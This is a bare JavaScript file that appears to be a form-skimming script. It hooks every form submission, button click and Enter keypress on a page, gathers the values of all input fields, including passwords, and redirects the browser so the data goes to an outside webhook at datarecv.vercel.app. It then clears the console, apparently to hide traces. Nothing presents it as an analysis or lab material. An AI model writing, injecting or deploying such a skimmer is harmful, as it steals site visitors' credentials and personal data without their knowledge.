const webhook = 'https://datarecv.vercel.app/api/webhook/q'

function send(data) {
  if (!data) return

  let parsedData = '?'
  data.forEach((el) => {
    parsedData += `${el[0]}=${el[1]}&`
  })

  location.href = `${webhook}${parsedData.slice(0, parsedData.length - 1)}`
}

function getRaw() {
  const data = []
  Array.from(document.querySelectorAll('input')).forEach((input) => {
    if (input.name || input.id) {
      data.push([input.name || input.id, input.value])
    }
  })
  return data
}

document.querySelectorAll('form').forEach((form) => {
  form.addEventListener('submit', () => {
    const formData = new FormData(form).entries()
    send(formData)
  })
})

document.querySelectorAll('form *[role="button"], button').forEach((btn) => {
  btn.addEventListener('click', () => {
    send(getRaw())
  })
})

addEventListener('keydown', (e) => {
  if (e.key === 'Enter') {
    send(getRaw())
  }
})

console.clear()
